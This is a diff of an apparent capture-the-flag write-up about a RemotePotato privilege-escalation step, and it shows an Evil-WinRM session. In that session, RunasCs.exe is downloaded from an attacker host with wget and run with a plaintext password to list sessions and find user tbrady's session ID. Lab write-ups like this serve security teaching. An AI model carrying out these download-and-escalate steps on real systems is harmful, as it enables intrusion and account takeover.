@@ -357,12 +357,11 @@ I can try something like remotepotato
 # RemotePotato
 ```python
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> wget http://10.10.14.90:8000/RunasCs.exe -o run.exe
-*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./run.exe qwinsta -l 9
-[-] Not enough arguments. 3 Arguments required. Use --help for additional help.
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./run.exe winrm_svc 'Password123!' qwinsta -l 9
 
  SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 >services                                    0  Disc
  console           tbrady                    1  Active
 ```
-I have found the ses
+I have found the session ID of `tbrady`
+
